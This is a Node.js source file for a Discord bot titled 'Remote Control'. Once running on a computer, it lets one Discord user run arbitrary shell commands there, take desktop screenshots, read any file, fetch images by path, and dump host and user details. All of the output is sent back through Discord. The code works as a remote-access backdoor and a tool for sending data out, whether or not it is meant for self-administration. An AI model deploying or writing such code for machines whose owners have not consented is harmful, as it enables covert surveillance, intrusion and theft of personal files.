const Discord = require('discord.js');
const client = new Discord.Client();

const screenshot = require('screenshot-desktop');
const { exec } = require("child_process");
var fs = require("fs");
const os = require('os');

var options = require('./config.json')
var prefix = options.prefix;

client.once('ready', () => {
	console.log('Bot is up and running');
});

client.on('message', message => {
    if (message.author.bot) return;
    if (message.author.id != options.id) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const cmd = args.shift().toLowerCase();
    let helpEmbed = new Discord.MessageEmbed()
        .setTitle('Remote Control - Help')
        .setDescription(`List of all commands. Prefix: ${prefix}`)
        .addFields(
            {name: 'help', value: 'Shows this message'},
            {name: 'execute', value: 'Execute shell commands'},
            {name: 'screenshot', value: 'Takes a screenshot'},
            {name: 'host-info', value: 'Prints the host computer info.'},
            {name: 'ntw-interfaces', value: 'Shows all Network Interfaces'},
            {name: 'readfile', value: 'Print the content of a file'},
            {name: 'photo', value: 'Let`s you view a photo by specifing the path'},
        );

    if (cmd === 'help') {
        message.channel.send(helpEmbed)
    } else if (cmd === "execute") {
        if (options.allowcmdexec != true) return;

        exec(`${args}`, (error, stdout, stderr) => {
            if (error) {
                console.log(`error: ${error.message}`);
                return;
            };
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                return;
            };
            console.log(`${stdout}`);

            let cmdEmbed = new Discord.MessageEmbed()
                .setTitle(`Command: ${args}`)
                .setDescription(`${stdout}`);
            message.channel.send(cmdEmbed)
        });
    } else if (cmd === "screenshot") {
        if (options.allowscreenshot != true) return;

        let imgName = 'scrshot' + Date.now();
        screenshot({ filename: `./screenshots/${imgName}.jpg`}).then((imgPath) => {
            message.channel.send(`Screenshot saved to: ${imgPath}`)
            message.channel.send('Screenshot:', {files: [`./screenshots/${imgName}.jpg`]})
        });
    } else if (cmd === 'readfile') {
        if (options.allowreadfile != true) return;

        let readfilepath = args[0];
        var text = fs.readFileSync(`${readfilepath}`, 'utf8');
        let readfileEmbed = new Discord.MessageEmbed()
            .setTitle(`File: ${readfilepath}`)
            .setDescription(`${text}`);
        message.channel.send(readfileEmbed)
    } else if (cmd === 'host-info') {
        if (options.allowosinfo != true) return;

        let arch = os.arch();
        let cpus = JSON.stringify(os.cpus());
        let freemem = os.freemem();
        let homedir = os.homedir();
        let hostname = os.hostname();
        let networkinterfaces = JSON.stringify(os.networkInterfaces());
        let platform = os.platform();
        let tempdir = os.tmpdir();
        let totalmem = os.totalmem();
        let type = os.type();
        let uptime = os.uptime();
        let userinfo = JSON.stringify(os.userInfo());

        let infoEmbed = new Discord.MessageEmbed()
            .setTitle(`Host Info: ${arch} ${platform} ${hostname}`)
            .addFields(
                {name: 'Architecture: ', value: `${arch}`},
                {name: 'CPUs', value: `${cpus}`},
                {name: 'Free Memory', value: `${freemem}`},
                {name: 'Home Folder', value: `${homedir}`},
                {name: 'Hostname', value: `${hostname}`},
                {name: 'Platform', value: `${platform}`},
                {name: 'Temp Folder', value: `${tempdir}`},
                {name: 'Total Memory', value: `${totalmem}`},
                {name: 'Type', value: `${type}`},
                {name: 'Uptime', value: `${uptime}`},
                {name: 'User Info', value: `${userinfo}`}
            );
        message.channel.send(infoEmbed);
    } else if (cmd === 'ntw-interfaces') {
        if (options.allowntwinterfaces != true) return;

        let networkinterfaces = JSON.stringify(os.networkInterfaces());
        message.channel.send(`Network Interfaces:\n${networkinterfaces}`);
    } else if (cmd === `photo`) {
        if (options.allowphotoview != true) return;

        let imgViewPath = args.join(" ");
        message.channel.send('Photo Viewer:', {files: [`${imgViewPath}`]})
    }
});

client.login(options.token);
